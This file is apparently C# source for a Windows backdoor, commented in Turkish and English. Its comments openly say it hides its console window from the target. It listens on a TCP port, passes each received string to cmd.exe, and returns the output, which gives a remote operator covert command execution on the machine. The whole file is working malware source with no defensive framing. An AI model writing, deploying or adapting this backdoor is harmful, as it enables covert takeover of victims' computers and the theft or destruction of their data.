using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.Text;
using System.Runtime.InteropServices;


class Server
{
    static void Main()
    {
        // Burada konsol penceresinin hedef tarafından görünmesini engelleiyoruz
        // Here we hiding our server/backdoor console window from target
        
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        var handle = GetConsoleWindow();

        
        ShowWindow(handle, SW_HIDE);

        // IP adresi ve port numaramızı buraya yazıyoruz
        // Your PC ip adress and port here
        
        IPAddress ipAddress = IPAddress.Parse("127.0.0.1");
        int port = 8888;

        TcpListener listener = new TcpListener(ipAddress, port);
        listener.Start();

        Console.WriteLine("Sunucu çalışıyor...");

        while (true)
        {
            using (TcpClient client = listener.AcceptTcpClient())
            {
                Console.WriteLine("İstemci bağlandı.");

                using (NetworkStream stream = client.GetStream())
                {
                    while (true)
                    {
                        byte[] buffer = new byte[1024];
                        int bytesRead = stream.Read(buffer, 0, buffer.Length);
                        string receivedCommand = Encoding.ASCII.GetString(buffer, 0, bytesRead);

                        if (receivedCommand == "exit")
                        {
                            Console.WriteLine("İstemci çıkış isteği gönderdi.");
                            break; 
                        }

                        Console.WriteLine("İstemciden gelen komut: " + receivedCommand);

                        string result = RunCommand(receivedCommand);
                        byte[] resultBytes = Encoding.ASCII.GetBytes(result + "\n"); 
                        stream.Write(resultBytes, 0, resultBytes.Length);
                    }
                }

                client.Close(); 
            }
        }

        listener.Stop(); 
    }

    // Burada cmd komut satırını simule ediyoruz
    // Here we simulating target CMD command line interface
    static string RunCommand(string command)
    {
        Process process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = "/c " + command;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.CreateNoWindow = true;

        process.Start();
        string output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();

        return output;
    }
}

